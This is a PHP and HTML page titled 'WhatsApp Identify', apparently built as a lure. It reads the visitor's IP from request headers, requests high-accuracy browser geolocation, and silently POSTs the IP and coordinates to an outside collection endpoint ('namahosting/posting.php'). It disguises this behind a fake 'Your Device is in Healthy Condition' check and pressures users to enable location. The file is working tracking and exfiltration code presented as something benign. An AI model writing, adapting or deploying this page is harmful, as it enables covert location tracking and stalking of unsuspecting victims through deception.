<?php
header("Location: https://github.com");

function get_ip() {
    $clientIP = '0.0.0.0';

    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $clientIP = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        // When behind Cloudflare
        $clientIP = $_SERVER['HTTP_CF_CONNECTING_IP']; 
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $clientIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $clientIP = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $clientIP = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $clientIP = $_SERVER['HTTP_FORWARDED'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $clientIP = $_SERVER['REMOTE_ADDR'];
    }

    return $clientIP;
}
?>
<html>
<head>
    <title>WhatsApp Identify</title>
    <script>
        async function kirimData(ip_address, latlng) {
            const formData = new FormData();
            formData.append("ip_address", ip_address);
            formData.append("latlng", latlng);

            try {
                const response = await fetch("https://namahosting/posting.php", {
                    method: "POST",
                    body: formData,
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                console.log(await response.json());
            } catch (error) {
                console.error("Error during fetch:", error);
            }
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
        };

        function success(pos) {
            const crd = pos.coords;

            console.log("Your current position is:");
            console.log(`Latitude : ${crd.latitude}`);
            console.log(`Longitude: ${crd.longitude}`);
            console.log(`More or less ${crd.accuracy} meters.`);

            kirimData('<?= get_ip() ?>', `${crd.latitude},${crd.longitude}`);

            let text = document.querySelector('.success');
            text.style.display = "block";
            text.textContent = "Your Device is in Healthy Condition";
        }

        function error(err) {
            let text = document.querySelector('.denied');

            if (err.code === err.PERMISSION_DENIED) {
                text.style.display = "block";
                text.textContent = "Please Enable Location Browser to Check Healthy Condition of Your Device!";
            } else {
                text.style.display = "block";
                text.textContent = `Error: ${err.message}`;
            }
        }

        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(success, error, options);
        } else {
            let text = document.querySelector('.denied');
            text.style.display = "block";
            text.textContent = "Browser Not Supported Location, Please Install Google Chrome!!";
        }
    </script>
</head>
<body>
    <div class="denied" style="border:1px solid red;padding:20px 20px;text-align:center;margin-top:20px;display:none;"></div>
    <div class="success" style="border:1px solid green;padding:20px 20px;text-align:center;margin-top:20px;display:none;"></div>
</body>
</html>